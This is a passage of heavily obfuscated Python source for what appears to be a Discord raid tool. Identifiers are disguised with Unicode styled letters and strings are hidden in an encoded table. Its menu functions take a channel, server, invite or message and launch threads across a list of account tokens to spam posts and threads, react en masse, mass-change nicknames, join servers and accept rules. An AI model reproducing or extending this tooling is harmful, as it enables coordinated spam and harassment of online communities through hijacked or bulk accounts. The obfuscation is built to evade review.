        𝘳𝗲𝙖𝗰𝙩𝘪𝗼𝘯 = 𝙞𝗻𝗽𝘶𝘵(f'{𝙧}{𝘔𝘔𝘕𝙄𝘔𝘐𝘔𝙄𝗹𝙈𝘕𝘕𝙈𝗡𝘭𝗠𝙈𝙡𝗠𝗜𝘭𝙄𝙉𝙄𝗡𝘕𝙄𝘔𝗡𝗡𝗜𝗹[91]}{𝗹𝘤}{𝗠𝗠𝙉𝘐𝘔𝘐𝘔𝙄𝙡𝗠𝗡𝗡𝙈𝙉𝗹𝗠𝘔𝘭𝙈𝙄𝙡𝘐𝙉𝙄𝘕𝙉𝙄𝗠𝙉𝘕𝙄𝗹[371]}{𝘳}{𝗠𝗠𝗡𝘐𝗠𝘐𝗠𝙄𝘭𝘔𝗡𝘕𝙈𝗡𝘭𝘔𝘔𝙡𝘔𝘐𝗹𝘐𝙉𝗜𝗡𝘕𝘐𝙈𝗡𝘕𝘐𝘭[365]}')
        if 𝘳𝗲𝙖𝘤𝘵𝘪𝘰𝘯 == 𝗠𝘔𝗡𝙄𝗠𝙄𝗠𝗜𝘭𝙈𝗡𝘕𝘔𝘕𝙡𝗠𝘔𝙡𝗠𝘐𝙡𝗜𝗡𝘐𝗡𝗡𝙄𝙈𝗡𝗡𝙄𝘭[22]:
            𝙈𝙚𝗻𝙪().main_menu()
        𝙤𝙨.system(𝙈𝙈𝙉𝘐𝘔𝗜𝘔𝗜𝗹𝘔𝗡𝙉𝘔𝙉𝗹𝘔𝘔𝘭𝘔𝗜𝗹𝘐𝗡𝙄𝙉𝘕𝗜𝘔𝙉𝗡𝗜𝙡[1])
        𝙥𝙧𝙞𝗻𝘁(𝘮𝗲𝗻𝘶)
        for 𝙩𝘰𝙠𝗲𝗻 in 𝙩𝙤𝗸𝙚𝙣𝘀:
            𝘁𝗵𝗿𝗲𝙖𝗱𝗶𝘯𝙜.Thread(target=𝘳𝙚𝘢𝙘𝘁𝗼𝘳, args=(𝘁𝘰𝗸𝘦𝘯, 𝗿𝘦𝘢𝘤𝘁𝗶𝙤𝘯, 𝙢𝗲𝘀𝘀𝙖𝘨𝘦_𝘭𝙞𝙣𝘬)).start()
        𝙚𝙭𝘪𝘁 = 𝗶𝘯𝗽𝘶𝘵(𝙈𝘔𝗡𝘐𝘔𝗜𝗠𝙄𝗹𝙈𝗡𝙉𝙈𝘕𝘭𝗠𝙈𝙡𝗠𝗜𝗹𝘐𝘕𝗜𝗡𝘕𝘐𝘔𝙉𝘕𝙄𝘭[22])
        𝘦𝙭𝘪𝘁 = 𝘔𝙚𝗻𝘶().main_menu()
        𝙚𝘅𝘪𝙩()

    @𝘸𝘳𝘢𝙥𝗽𝗲𝘳
    def forms(self):
        𝗼𝘴.system(𝙈𝗠𝗡𝙄𝙈𝙄𝙈𝗜𝗹𝘔𝗡𝗡𝗠𝙉𝙡𝘔𝘔𝘭𝙈𝗜𝘭𝘐𝗡𝙄𝘕𝘕𝘐𝙈𝗡𝙉𝙄𝙡[1])
        𝘱𝘳𝙞𝙣𝘁(𝘮𝙚𝘯𝙪)
        𝗼𝘴.system(𝘔𝙈𝙉𝙄𝘔𝘐𝘔𝙄𝘭𝘔𝘕𝗡𝗠𝘕𝙡𝙈𝗠𝗹𝗠𝘐𝘭𝘐𝗡𝘐𝗡𝗡𝗜𝘔𝘕𝙉𝙄𝙡[372])
        𝘤𝗵𝙖𝗻𝘯𝗲𝗹 = 𝗡𝗰𝗻𝗶𝙮𝗦𝗱𝗙𝘺𝙀𝘶𝘪𝗗𝗣3𝘚𝗱𝘧𝘰𝘃𝙓𝗬4𝘒1𝗡𝘫𝙇𝙂𝙪𝘔𝘙.mro()[7](𝗶𝘯𝗽𝘂𝘁(f'{𝗿}{𝗠𝘔𝙉𝘐𝘔𝘐𝙈𝘐𝙡𝙈𝙉𝙉𝙈𝙉𝙡𝗠𝘔𝙡𝗠𝘐𝗹𝙄𝙉𝘐𝗡𝘕𝘐𝙈𝘕𝙉𝘐𝙡[91]}{𝗹𝙘}{𝗠𝗠𝙉𝘐𝙈𝙄𝗠𝘐𝗹𝙈𝙉𝙉𝘔𝗡𝙡𝘔𝗠𝘭𝙈𝙄𝘭𝘐𝗡𝘐𝘕𝘕𝘐𝙈𝘕𝘕𝘐𝙡[373]}{𝘳}{𝘔𝘔𝘕𝙄𝗠𝙄𝘔𝗜𝙡𝗠𝘕𝙉𝙈𝘕𝘭𝗠𝗠𝙡𝘔𝗜𝘭𝗜𝙉𝘐𝗡𝘕𝙄𝙈𝘕𝘕𝗜𝘭[365]}'))
        if 𝘤𝗵𝗮𝙣𝗻𝘦𝘭 == 𝙈𝘔𝙉𝘐𝙈𝗜𝙈𝘐𝘭𝙈𝙉𝗡𝙈𝘕𝙡𝗠𝗠𝗹𝘔𝗜𝘭𝙄𝗡𝗜𝙉𝙉𝙄𝗠𝙉𝘕𝘐𝗹[22]:
            𝘔𝙚𝙣𝘶().main_menu()
        𝗻𝙖𝘮𝘦 = 𝗶𝘯𝗽𝘂𝘁(f'{𝘳}{𝘔𝗠𝗡𝙄𝙈𝗜𝙈𝙄𝘭𝗠𝙉𝙉𝗠𝘕𝘭𝘔𝘔𝙡𝗠𝙄𝙡𝙄𝗡𝘐𝗡𝙉𝙄𝗠𝗡𝘕𝗜𝗹[91]}{𝗹𝙘}{𝗠𝙈𝗡𝘐𝘔𝘐𝘔𝗜𝗹𝙈𝙉𝙉𝙈𝘕𝙡𝘔𝘔𝗹𝙈𝘐𝗹𝙄𝙉𝘐𝗡𝗡𝙄𝙈𝙉𝘕𝙄𝗹[374]}{𝙧}{𝗠𝗠𝘕𝘐𝘔𝗜𝗠𝗜𝙡𝙈𝘕𝘕𝘔𝙉𝙡𝘔𝗠𝗹𝙈𝘐𝘭𝗜𝗡𝗜𝗡𝗡𝙄𝘔𝘕𝘕𝙄𝘭[365]}')
        if 𝘯𝘢𝘮𝙚 == 𝗠𝗠𝙉𝘐𝗠𝙄𝗠𝘐𝗹𝘔𝗡𝘕𝗠𝘕𝘭𝗠𝘔𝗹𝗠𝙄𝘭𝘐𝘕𝗜𝙉𝘕𝗜𝘔𝙉𝗡𝘐𝙡[22]:
            𝙈𝘦𝙣𝘶().main_menu()
        𝘮𝘴𝘨 = 𝘪𝘯𝘱𝘶𝘁(f'{𝘳}{𝙈𝗠𝙉𝗜𝙈𝗜𝙈𝙄𝙡𝙈𝘕𝘕𝗠𝙉𝙡𝙈𝙈𝙡𝘔𝗜𝘭𝗜𝘕𝗜𝙉𝙉𝗜𝗠𝙉𝗡𝘐𝙡[91]}{𝙡𝙘}{𝙈𝙈𝘕𝘐𝘔𝘐𝗠𝘐𝙡𝙈𝙉𝗡𝙈𝙉𝗹𝗠𝗠𝗹𝙈𝘐𝗹𝗜𝗡𝗜𝘕𝗡𝗜𝘔𝘕𝘕𝘐𝙡[375]}{𝘳}{𝘔𝘔𝗡𝘐𝘔𝗜𝙈𝙄𝗹𝘔𝗡𝙉𝙈𝘕𝗹𝗠𝗠𝙡𝘔𝙄𝙡𝗜𝙉𝘐𝘕𝘕𝘐𝗠𝙉𝗡𝙄𝙡[365]}')
        if 𝗺𝙨𝘨 == 𝗠𝙈𝗡𝗜𝙈𝙄𝙈𝗜𝗹𝙈𝘕𝘕𝘔𝘕𝗹𝗠𝙈𝘭𝙈𝗜𝙡𝙄𝙉𝗜𝗡𝗡𝘐𝗠𝙉𝙉𝘐𝘭[22]:
            𝙈𝘦𝘯𝘶().main_menu()
        𝙤𝘴.system(𝙈𝙈𝘕𝗜𝗠𝗜𝗠𝙄𝙡𝙈𝗡𝘕𝗠𝙉𝘭𝗠𝗠𝙡𝘔𝘐𝙡𝙄𝗡𝙄𝗡𝙉𝘐𝙈𝙉𝙉𝗜𝙡[1])
        𝙥𝙧𝘪𝙣𝙩(𝗺𝘦𝗻𝘂)
        for 𝙩𝘰𝗸𝗲𝘯 in 𝘵𝘰𝙠𝙚𝙣𝙨:
            𝙩𝗵𝘳𝙚𝘢𝘥𝙞𝙣𝙜.Thread(target=𝙥𝙤𝙨𝙩_𝘴𝙥𝙖𝘮𝙢𝙚𝗿, args=(𝙩𝗼𝙠𝘦𝗻, 𝘤𝘩𝙖𝘯𝙣𝗲𝙡, 𝘯𝙖𝙢𝗲, 𝗺𝙨𝗴)).start()
        𝘦𝘹𝙞𝙩 = 𝗶𝗻𝙥𝙪𝘁(𝘔𝘔𝗡𝗜𝗠𝗜𝘔𝙄𝙡𝗠𝘕𝗡𝘔𝙉𝗹𝙈𝗠𝙡𝙈𝗜𝙡𝙄𝘕𝗜𝙉𝗡𝘐𝗠𝘕𝗡𝗜𝗹[22])
        𝘦𝙭𝙞𝘵 = 𝗠𝘦𝗻𝙪().main_menu()
        𝗲𝘅𝘪𝙩()

    @𝙬𝗿𝗮𝙥𝘱𝙚𝘳
    def thread(self):
        𝗼𝘴.system(𝗠𝗠𝗡𝙄𝙈𝗜𝙈𝗜𝙡𝗠𝘕𝗡𝙈𝗡𝙡𝘔𝙈𝘭𝘔𝗜𝘭𝙄𝗡𝗜𝘕𝗡𝘐𝙈𝙉𝗡𝙄𝗹[1])
        𝙥𝙧𝘪𝙣𝘁(𝙢𝗲𝙣𝙪)
        𝗼𝘴.system(𝗠𝙈𝘕𝗜𝘔𝘐𝘔𝙄𝙡𝘔𝘕𝗡𝘔𝘕𝗹𝘔𝙈𝗹𝙈𝗜𝗹𝘐𝙉𝗜𝗡𝘕𝙄𝙈𝙉𝗡𝗜𝗹[376])
        𝗻𝙖𝘮𝘦 = 𝗶𝙣𝗽𝙪𝘵(f'{𝙧}{𝗠𝘔𝗡𝗜𝗠𝗜𝙈𝙄𝗹𝗠𝘕𝙉𝗠𝗡𝙡𝙈𝙈𝗹𝗠𝗜𝙡𝗜𝘕𝘐𝘕𝙉𝙄𝘔𝗡𝗡𝘐𝙡[91]}{𝗹𝙘}{𝗠𝘔𝗡𝘐𝙈𝙄𝘔𝙄𝗹𝘔𝙉𝙉𝘔𝘕𝙡𝘔𝗠𝙡𝙈𝘐𝘭𝗜𝙉𝙄𝙉𝙉𝗜𝙈𝗡𝘕𝘐𝙡[377]}{𝘳}{𝘔𝗠𝘕𝙄𝙈𝗜𝙈𝗜𝙡𝘔𝘕𝙉𝗠𝘕𝘭𝙈𝗠𝘭𝙈𝘐𝗹𝗜𝙉𝗜𝗡𝗡𝙄𝗠𝙉𝗡𝗜𝘭[365]}')
        if 𝗻𝘢𝙢𝘦 == 𝙈𝘔𝘕𝗜𝗠𝙄𝗠𝙄𝗹𝗠𝘕𝙉𝘔𝙉𝘭𝘔𝘔𝘭𝗠𝗜𝙡𝗜𝙉𝗜𝗡𝘕𝙄𝙈𝙉𝙉𝘐𝙡[22]:
            𝙈𝙚𝗻𝙪().main_menu()
        𝘤𝗵𝘢𝗻𝘯𝘦𝘭 = 𝘑𝘼𝘤𝘵𝘋𝙎𝘆𝙎𝗹𝙭𝘌𝘄0648𝘯𝘸𝘉8𝘟𝗤𝗞𝘉1𝘢𝗛8𝙈𝘄𝗯𝙘.mro()[5](𝗶𝙣𝗽𝘂𝙩(f'{𝘳}{𝙈𝙈𝗡𝗜𝘔𝙄𝗠𝘐𝗹𝙈𝙉𝘕𝗠𝘕𝙡𝘔𝗠𝘭𝗠𝙄𝗹𝙄𝙉𝙄𝗡𝗡𝙄𝘔𝗡𝘕𝘐𝘭[91]}{𝗹𝗰}{𝘔𝙈𝘕𝘐𝘔𝗜𝗠𝙄𝘭𝙈𝘕𝘕𝗠𝙉𝗹𝙈𝙈𝗹𝙈𝘐𝗹𝙄𝙉𝗜𝙉𝘕𝙄𝘔𝘕𝙉𝗜𝙡[373]}{𝘳}{𝘔𝘔𝘕𝘐𝗠𝗜𝘔𝗜𝙡𝗠𝙉𝘕𝙈𝗡𝗹𝙈𝗠𝙡𝙈𝗜𝗹𝙄𝗡𝘐𝗡𝘕𝙄𝗠𝘕𝘕𝗜𝙡[365]}'))
        if 𝘤𝘩𝘢𝗻𝗻𝗲𝙡 == 𝗠𝘔𝘕𝘐𝙈𝗜𝗠𝘐𝘭𝗠𝙉𝙉𝗠𝗡𝙡𝗠𝙈𝗹𝙈𝘐𝙡𝗜𝙉𝗜𝙉𝙉𝗜𝘔𝘕𝙉𝗜𝙡[22]:
            𝙈𝗲𝙣𝙪().main_menu()
        𝘰𝘀.system(𝙈𝘔𝙉𝗜𝗠𝘐𝗠𝗜𝙡𝗠𝗡𝗡𝗠𝘕𝙡𝘔𝘔𝗹𝙈𝘐𝗹𝘐𝙉𝘐𝗡𝙉𝙄𝗠𝙉𝗡𝙄𝙡[1])
        𝘱𝙧𝙞𝙣𝙩(𝙢𝗲𝘯𝘂)
        for 𝘁𝗼𝙠𝗲𝘯 in 𝘁𝘰𝗸𝘦𝙣𝘀:
            𝘁𝙝𝘳𝗲𝗮𝗱𝙞𝗻𝙜.Thread(target=𝘁𝗵𝗿𝘦𝙖𝗱_𝘀𝘱𝗮𝙢𝘮𝗲𝙧, args=(𝘵𝗼𝗸𝘦𝙣, 𝙣𝙖𝙢𝗲, 𝗰𝗵𝙖𝘯𝗻𝗲𝘭)).start()
        𝘦𝙭𝗶𝘵 = 𝙞𝘯𝙥𝘂𝙩(𝙈𝙈𝘕𝘐𝙈𝗜𝘔𝗜𝗹𝙈𝘕𝘕𝗠𝘕𝗹𝙈𝘔𝗹𝗠𝙄𝗹𝗜𝙉𝗜𝘕𝗡𝗜𝙈𝗡𝙉𝘐𝘭[22])
        𝙚𝘹𝘪𝘁 = 𝘔𝗲𝙣𝘂().main_menu()
        𝗲𝙭𝗶𝙩()

    @𝙬𝗿𝗮𝙥𝙥𝙚𝗿
    def Nick(self):
        𝗼𝘀.system(𝗠𝙈𝙉𝙄𝗠𝘐𝘔𝘐𝘭𝘔𝙉𝙉𝘔𝗡𝘭𝙈𝙈𝗹𝗠𝘐𝙡𝙄𝘕𝘐𝘕𝗡𝗜𝙈𝗡𝘕𝘐𝗹[378])
        𝙤𝙨.system(𝗠𝘔𝙉𝗜𝗠𝙄𝙈𝘐𝘭𝘔𝘕𝗡𝘔𝘕𝘭𝘔𝗠𝙡𝗠𝗜𝗹𝗜𝘕𝙄𝙉𝘕𝘐𝘔𝙉𝗡𝘐𝗹[1])
        𝙥𝗿𝘪𝗻𝘵(𝗺𝘦𝙣𝘂)
        𝙜𝙪𝘪𝙡𝘥 = 𝗪𝙕𝘑𝙒𝘡𝘚𝘭𝙤_𝙎𝘊𝙕𝗫3𝗝_8𝙎𝙃𝘻3𝗾𝙑𝙙𝗺𝙖36𝘞𝘀𝘟𝘏.mro()[5](𝙞𝘯𝙥𝘂𝘵(f'{𝗿}{𝘔𝗠𝘕𝙄𝗠𝗜𝘔𝗜𝙡𝙈𝙉𝙉𝗠𝗡𝗹𝙈𝘔𝗹𝗠𝗜𝘭𝗜𝗡𝙄𝗡𝘕𝙄𝙈𝗡𝗡𝗜𝗹[91]}{𝗹𝘤}{𝙈𝗠𝗡𝗜𝙈𝗜𝘔𝗜𝗹𝗠𝙉𝗡𝗠𝗡𝗹𝘔𝙈𝗹𝙈𝙄𝙡𝗜𝘕𝘐𝙉𝘕𝙄𝗠𝙉𝗡𝙄𝗹[379]}{𝗿}{𝘔𝘔𝗡𝗜𝙈𝙄𝘔𝘐𝙡𝙈𝗡𝙉𝗠𝘕𝗹𝘔𝙈𝙡𝙈𝙄𝗹𝙄𝗡𝗜𝗡𝘕𝙄𝘔𝘕𝘕𝙄𝙡[365]}'))
        if 𝗴𝘂𝘪𝙡𝘥 == 𝗠𝙈𝘕𝗜𝗠𝙄𝗠𝘐𝗹𝗠𝘕𝘕𝗠𝘕𝗹𝙈𝘔𝘭𝗠𝗜𝗹𝙄𝘕𝗜𝘕𝗡𝙄𝗠𝘕𝗡𝘐𝙡[22]:
            𝘔𝙚𝘯𝙪().main_menu()
        𝙣𝗶𝙘𝙠 = 𝗶𝘯𝘱𝙪𝘁(f'{𝘳}{𝘔𝙈𝗡𝘐𝙈𝘐𝙈𝗜𝗹𝘔𝘕𝘕𝗠𝗡𝘭𝘔𝗠𝙡𝗠𝘐𝘭𝙄𝘕𝙄𝗡𝗡𝙄𝗠𝗡𝘕𝙄𝙡[91]}{𝗹𝙘}{𝗠𝙈𝘕𝗜𝗠𝗜𝙈𝘐𝘭𝗠𝗡𝗡𝗠𝗡𝗹𝗠𝗠𝗹𝗠𝙄𝘭𝘐𝙉𝘐𝘕𝙉𝘐𝗠𝗡𝗡𝘐𝗹[380]}{𝘳}{𝘔𝘔𝗡𝘐𝘔𝘐𝙈𝙄𝗹𝗠𝘕𝘕𝙈𝗡𝘭𝘔𝙈𝘭𝗠𝘐𝙡𝗜𝘕𝗜𝗡𝗡𝗜𝗠𝙉𝘕𝙄𝗹[365]}')
        if 𝗻𝘪𝗰𝘬 == 𝘔𝘔𝘕𝙄𝘔𝙄𝙈𝗜𝙡𝗠𝙉𝘕𝙈𝙉𝘭𝘔𝙈𝗹𝘔𝗜𝘭𝗜𝙉𝘐𝗡𝗡𝙄𝘔𝗡𝗡𝘐𝘭[22]:
            𝗠𝙚𝗻𝘶().main_menu()
        𝘰𝘀.system(𝗠𝘔𝘕𝘐𝘔𝗜𝗠𝘐𝙡𝙈𝘕𝗡𝗠𝗡𝙡𝗠𝘔𝗹𝘔𝗜𝗹𝗜𝘕𝙄𝗡𝙉𝙄𝗠𝗡𝙉𝙄𝘭[1])
        𝗽𝗿𝘪𝗻𝘵(𝗺𝘦𝘯𝙪)
        for 𝘁𝙤𝘬𝘦𝗻 in 𝙩𝘰𝘬𝙚𝗻𝙨:
            𝘁𝗵𝗿𝙚𝗮𝘥𝘪𝗻𝘨.Thread(target=𝘮𝘢𝘴𝘀_𝗻𝘪𝗰𝘬, args=(𝘵𝙤𝘬𝙚𝘯, 𝗴𝘂𝙞𝙡𝗱, 𝗻𝗶𝗰𝘬)).start()
        𝘦𝙭𝙞𝘁 = 𝙞𝘯𝘱𝘂𝘁(𝘔𝙈𝙉𝙄𝘔𝘐𝗠𝗜𝗹𝘔𝙉𝙉𝘔𝗡𝘭𝘔𝘔𝗹𝙈𝗜𝙡𝙄𝘕𝘐𝙉𝘕𝗜𝗠𝗡𝙉𝗜𝙡[22])
        𝘦𝘹𝘪𝙩 = 𝙈𝘦𝙣𝘂().main_menu()
        𝙚𝘹𝙞𝙩()

    @𝙬𝙧𝙖𝗽𝗽𝙚𝗿
    def Check_guild(self):
        𝗼𝘴.system(𝙈𝙈𝗡𝗜𝙈𝙄𝙈𝙄𝗹𝗠𝗡𝙉𝗠𝙉𝗹𝘔𝗠𝘭𝘔𝙄𝙡𝙄𝙉𝗜𝙉𝗡𝗜𝘔𝘕𝗡𝙄𝗹[381])
        𝘰𝘀.system(𝙈𝗠𝗡𝗜𝗠𝘐𝗠𝙄𝗹𝘔𝘕𝘕𝙈𝘕𝙡𝗠𝗠𝗹𝘔𝙄𝗹𝗜𝗡𝘐𝗡𝗡𝗜𝗠𝘕𝘕𝘐𝙡[1])
        𝗽𝙧𝘪𝘯𝘵(𝗺𝙚𝘯𝘂)
        𝙜𝘂𝗶𝗹𝙙𝙞𝘥 = 𝘪𝘯𝗽𝘂𝙩(f'{𝗿}{𝙈𝘔𝙉𝙄𝙈𝘐𝙈𝗜𝘭𝗠𝗡𝙉𝘔𝙉𝗹𝘔𝗠𝘭𝗠𝗜𝘭𝗜𝙉𝘐𝘕𝗡𝗜𝙈𝙉𝙉𝙄𝙡[91]}{𝙡𝙘}{𝙈𝙈𝙉𝗜𝘔𝘐𝙈𝘐𝘭𝘔𝙉𝗡𝘔𝙉𝙡𝗠𝗠𝗹𝗠𝙄𝙡𝘐𝗡𝙄𝗡𝗡𝗜𝗠𝘕𝗡𝗜𝘭[379]}{𝗿}{𝗠𝗠𝙉𝗜𝗠𝘐𝗠𝗜𝘭𝙈𝘕𝙉𝙈𝘕𝘭𝘔𝙈𝗹𝙈𝘐𝗹𝙄𝗡𝙄𝙉𝗡𝗜𝗠𝗡𝘕𝗜𝗹[365]}')
        if 𝘨𝘂𝙞𝘭𝗱𝙞𝘥 == 𝙈𝙈𝗡𝙄𝙈𝗜𝗠𝙄𝘭𝗠𝗡𝗡𝙈𝙉𝙡𝙈𝙈𝙡𝘔𝙄𝗹𝗜𝘕𝙄𝙉𝘕𝗜𝘔𝙉𝙉𝙄𝗹[22]:
            𝙈𝗲𝗻𝙪().main_menu()
        𝗼𝘀.system(𝘔𝙈𝗡𝗜𝗠𝘐𝘔𝘐𝗹𝗠𝘕𝗡𝘔𝙉𝘭𝙈𝙈𝘭𝘔𝙄𝗹𝘐𝙉𝙄𝘕𝘕𝗜𝙈𝙉𝙉𝗜𝘭[1])
        𝗽𝙧𝘪𝙣𝘵(𝗺𝘦𝘯𝘂)
        𝘴𝘢𝘃𝘦_𝘵𝘰𝗸𝗲𝗻𝘀_𝙜𝘂𝗶𝙡𝗱(𝙈𝘔𝗡𝗜𝙈𝘐𝗠𝘐𝙡𝗠𝗡𝗡𝗠𝙉𝗹𝗠𝘔𝙡𝙈𝗜𝙡𝙄𝗡𝗜𝙉𝗡𝘐𝗠𝗡𝘕𝗜𝗹[59], 𝙜𝘶𝘪𝘭𝘥𝗶𝗱)
        𝘦𝘹𝙞𝘁 = 𝗶𝘯𝗽𝙪𝙩(𝙈𝗠𝘕𝙄𝘔𝗜𝗠𝗜𝙡𝘔𝗡𝘕𝗠𝗡𝘭𝘔𝗠𝙡𝘔𝗜𝗹𝙄𝗡𝙄𝘕𝙉𝙄𝙈𝘕𝗡𝗜𝙡[22])
        𝘦𝘅𝗶𝘁 = 𝗠𝗲𝙣𝙪().main_menu()
        𝘦𝙭𝙞𝙩()

    @𝘄𝗿𝘢𝘱𝙥𝗲𝘳
    def joiner(self):
        𝗼𝘀.system(𝘔𝘔𝗡𝘐𝗠𝘐𝗠𝘐𝘭𝙈𝘕𝗡𝘔𝙉𝗹𝗠𝙈𝘭𝗠𝙄𝗹𝗜𝘕𝗜𝗡𝘕𝗜𝗠𝙉𝙉𝘐𝘭[140])
        𝗼𝘀.system(𝗠𝘔𝗡𝘐𝗠𝙄𝘔𝙄𝘭𝘔𝘕𝗡𝗠𝗡𝗹𝘔𝗠𝙡𝙈𝙄𝘭𝙄𝗡𝙄𝘕𝙉𝘐𝗠𝘕𝙉𝘐𝘭[1])
        𝗽𝙧𝗶𝙣𝘵(𝘮𝙚𝗻𝙪)
        𝘪𝗻𝘃𝗶𝙩𝗲 = 𝙞𝘯𝙥𝘶𝘵(f'{𝙧}{𝘔𝘔𝗡𝙄𝘔𝘐𝙈𝙄𝗹𝙈𝘕𝘕𝗠𝙉𝗹𝗠𝙈𝗹𝘔𝗜𝙡𝙄𝘕𝙄𝙉𝗡𝘐𝙈𝙉𝗡𝘐𝗹[91]}{𝗹𝘤}{𝘔𝙈𝙉𝘐𝙈𝘐𝗠𝙄𝘭𝘔𝙉𝘕𝘔𝘕𝙡𝙈𝗠𝗹𝗠𝙄𝙡𝙄𝘕𝘐𝘕𝘕𝘐𝘔𝗡𝗡𝗜𝘭[382]}{𝘳}{𝗠𝗠𝘕𝗜𝘔𝘐𝗠𝙄𝙡𝗠𝗡𝘕𝘔𝗡𝙡𝙈𝗠𝙡𝘔𝙄𝗹𝙄𝙉𝙄𝗡𝗡𝘐𝗠𝘕𝗡𝙄𝗹[93]}')
        if 𝘪𝗻𝘃𝙞𝘁𝙚 == 𝗠𝗠𝗡𝘐𝗠𝙄𝙈𝘐𝗹𝙈𝗡𝗡𝘔𝙉𝘭𝙈𝙈𝙡𝘔𝘐𝘭𝘐𝘕𝗜𝗡𝗡𝗜𝗠𝘕𝗡𝗜𝗹[22]:
            𝗠𝗲𝗻𝘂().main_menu()
        𝘥𝗲𝘭𝘢𝘺 = 𝙉𝘳𝙙480𝗮𝙟𝗤𝘆𝘪𝘿9𝘏𝙘𝘍𝘇𝙩𝗿𝗮2_1𝘩𝗯𝗢𝘧𝘱𝙤𝘋8𝙚.mro()[9](𝗶𝗻𝙥𝙪𝘁(f'{𝙧}{𝘔𝘔𝘕𝙄𝘔𝘐𝙈𝗜𝙡𝙈𝗡𝙉𝙈𝗡𝗹𝙈𝗠𝘭𝘔𝗜𝗹𝗜𝙉𝘐𝙉𝘕𝙄𝗠𝘕𝙉𝘐𝘭[91]}{𝘭𝗰}{𝘔𝘔𝗡𝙄𝗠𝙄𝗠𝗜𝙡𝘔𝘕𝗡𝗠𝘕𝘭𝘔𝙈𝘭𝙈𝘐𝙡𝗜𝘕𝘐𝘕𝗡𝙄𝘔𝗡𝙉𝗜𝘭[383]}{𝗿}{𝗠𝙈𝗡𝗜𝙈𝗜𝘔𝘐𝘭𝙈𝗡𝙉𝘔𝘕𝙡𝗠𝙈𝙡𝘔𝘐𝗹𝘐𝗡𝘐𝗡𝙉𝘐𝗠𝙉𝘕𝘐𝙡[365]}'))
        if 𝙙𝗲𝘭𝘢𝘺 == 𝘔𝘔𝗡𝙄𝘔𝙄𝗠𝙄𝗹𝗠𝗡𝙉𝙈𝘕𝗹𝘔𝗠𝗹𝗠𝙄𝙡𝗜𝙉𝘐𝗡𝙉𝙄𝗠𝘕𝘕𝙄𝗹[22]:
            𝗠𝘦𝘯𝘶().main_menu()
        if 𝗶𝙣𝙫𝙞𝘵𝗲.startswith(𝙈𝗠𝙉𝙄𝙈𝗜𝘔𝘐𝘭𝘔𝙉𝗡𝙈𝙉𝘭𝘔𝙈𝗹𝘔𝙄𝙡𝘐𝙉𝙄𝙉𝙉𝘐𝙈𝘕𝘕𝙄𝗹[384]):
            𝗶𝘯𝘃𝙞𝘵𝗲_𝙣𝘢𝙢𝘦 = 𝗶𝗻𝘃𝘪𝘁𝙚.replace(𝗠𝘔𝗡𝙄𝗠𝘐𝗠𝘐𝗹𝗠𝗡𝙉𝙈𝗡𝗹𝘔𝘔𝗹𝙈𝘐𝙡𝘐𝘕𝙄𝗡𝙉𝗜𝙈𝗡𝘕𝗜𝗹[384], 𝙈𝘔𝙉𝘐𝗠𝗜𝗠𝘐𝗹𝘔𝘕𝗡𝘔𝙉𝘭𝘔𝘔𝘭𝘔𝙄𝘭𝘐𝙉𝗜𝗡𝙉𝙄𝙈𝗡𝗡𝙄𝘭[22]).split(𝙈𝘔𝙉𝗜𝙈𝗜𝗠𝙄𝙡𝘔𝘕𝘕𝗠𝘕𝘭𝘔𝙈𝘭𝘔𝙄𝙡𝙄𝙉𝘐𝘕𝙉𝗜𝗠𝘕𝗡𝗜𝙡[315])[-1]
        else:
            𝙞𝙣𝘷𝘪𝘵𝙚_𝗻𝘢𝘮𝙚 = 𝗶𝗻𝘷𝙞𝙩𝗲.split(𝗠𝘔𝘕𝘐𝗠𝘐𝙈𝗜𝘭𝙈𝗡𝙉𝗠𝙉𝘭𝘔𝙈𝘭𝙈𝘐𝘭𝙄𝘕𝘐𝗡𝗡𝙄𝗠𝗡𝙉𝗜𝙡[315])[-1]
        𝙖𝗿𝘨𝙨 = [(𝙩𝗼𝗸𝙚𝘯, 𝘪𝗻𝘷𝙞𝘁𝙚_𝗻𝘢𝙢𝙚) for 𝘵𝗼𝘬𝘦𝗻 in 𝙩𝙤𝙠𝗲𝙣𝙨]
        𝘴𝘭𝙚𝘦𝙥(𝗱𝗲𝗹𝙖𝙮)
        𝘀𝗲𝘭𝗳.run(𝘀𝘦𝘭𝙛.raider.joiner, 𝙖𝙧𝗴𝘀)

    @𝘄𝙧𝘢𝘱𝙥𝙚𝙧
    def accept_rules(self):
        𝗼𝘀.system(𝗠𝙈𝗡𝘐𝗠𝙄𝙈𝘐𝗹𝘔𝙉𝗡𝙈𝗡𝗹𝗠𝘔𝘭𝙈𝗜𝗹𝗜𝙉𝘐𝘕𝘕𝘐𝙈𝘕𝘕𝙄𝗹[385])
        𝘰𝘴.system(𝘔𝗠𝘕𝘐𝘔𝗜𝘔𝙄𝗹𝗠𝘕𝗡𝙈𝘕𝗹𝗠𝘔𝙡𝗠𝙄𝙡𝘐𝗡𝘐𝘕𝙉𝙄𝘔𝗡𝗡𝗜𝙡[1])
        𝙥𝘳𝙞𝘯𝙩(𝗺𝗲𝘯𝘶)
        𝘀𝙚𝗿𝘃𝙚𝗿_𝙞𝙙 = 𝗶𝘯𝙥𝘶𝙩(𝙈𝗠𝘕𝙄𝗠𝘐𝘔𝗜𝘭𝗠𝙉𝙉𝗠𝘕𝘭𝗠𝗠𝗹𝙈𝗜𝘭𝗜𝙉𝘐𝗡𝙉𝙄𝙈𝘕𝙉𝙄𝘭[386])
        if 𝙨𝗲𝘳𝘷𝘦𝘳_𝙞𝗱 == 𝙈𝘔𝗡𝗜𝙈𝘐𝘔𝙄𝗹𝙈𝙉𝘕𝘔𝘕𝘭𝘔𝗠𝘭𝙈𝘐𝘭𝙄𝙉𝘐𝘕𝘕𝗜𝘔𝗡𝗡𝗜𝗹[22]:
            𝙈𝘦𝘯𝘶().main_menu()
        𝙤𝙨.system(𝗠𝙈𝗡𝘐𝗠𝗜𝘔𝙄𝙡𝙈𝙉𝗡𝗠𝘕𝗹𝘔𝘔𝘭𝘔𝗜𝘭𝙄𝗡𝙄𝗡𝘕𝙄𝙈𝘕𝗡𝘐𝙡[1])
        𝙥𝘳𝙞𝙣𝙩(𝗺𝗲𝙣𝙪)
        for 𝘁𝗼𝙠𝙚𝘯 in 𝘁𝙤𝙠𝗲𝘯𝙨:
            𝘁𝙝𝙧𝘦𝘢𝘥𝘪𝗻𝘨.Thread(target=𝘢𝗰𝗰𝘦𝗽𝘵_𝘳𝘂𝘭𝗲𝘀𝘀, args=(𝙨𝙚𝘳𝘷𝘦𝗿_𝙞𝙙, 𝘵𝙤𝘬𝙚𝙣)).start()
